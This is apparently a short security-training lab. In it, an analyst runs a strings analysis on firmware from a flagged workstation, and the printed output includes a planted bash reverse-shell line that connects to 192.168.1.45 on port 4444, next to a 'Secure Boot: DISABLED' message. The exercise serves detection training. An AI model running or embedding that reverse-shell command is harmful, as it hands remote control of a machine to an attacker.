![image](/FilesForLabs/images/blueantisyphon.png)

## Firmware String Extraction

A security analyst extracts a firmware binary from a workstation that was flagged during routine auditing. They run a basic strings analysis on it and find the following output among the results:

```
UEFI Firmware v2.1
Copyright (c) 2021 LegitVendor Inc.
Initializing hardware...
/bin/sh -i >& /dev/tcp/192.168.1.45/4444 0>&1
Loading boot manager...
Secure Boot: DISABLED
```
